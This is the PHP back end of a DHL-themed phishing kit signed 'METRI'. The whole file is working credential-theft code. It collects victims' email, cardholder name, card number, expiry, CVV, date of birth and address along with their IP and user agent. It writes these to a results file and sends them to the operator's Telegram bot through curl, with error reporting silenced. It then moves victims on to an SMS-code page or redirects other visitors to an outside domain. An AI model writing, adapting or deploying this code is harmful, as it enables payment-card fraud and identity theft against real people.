<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if ($_POST['type'] == "infos") {

            $message = '/== DHL INFOS By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Email address: ' . $_POST['em'] . "\r\n";
            $message .= 'Card holder name : ' . $_POST['nc'] . "\r\n";
            $message .= 'Numero de carte : ' . $_POST['nu'] . "\r\n";
            $message .= 'Expiration (mm/yy) : ' . $_POST['en'] . "\r\n";
            $message .= 'CCV : ' . $_POST['cs'] . "\r\n";
            $message .= 'DOB : ' . $_POST['db'] . "\r\n";
            $message .= 'Address : ' . $_POST['dr'] . "\r\n";
            $message .= 'City : ' . $_POST['ct'] . "\r\n";
            $message .= 'State : ' . $_POST['te'] . "\r\n";
            $message .= 'Zip Code : ' . $_POST['zp'] . "\r\n";
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- END details INFOS --/' . "\r\n\r\n";

            file_put_contents("./rezult/rzlt.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            header("location: sms.php?cn=". $_POST['nu']);
}
else {
header("location: http://guiminer.co.technology/rd/");
}

?>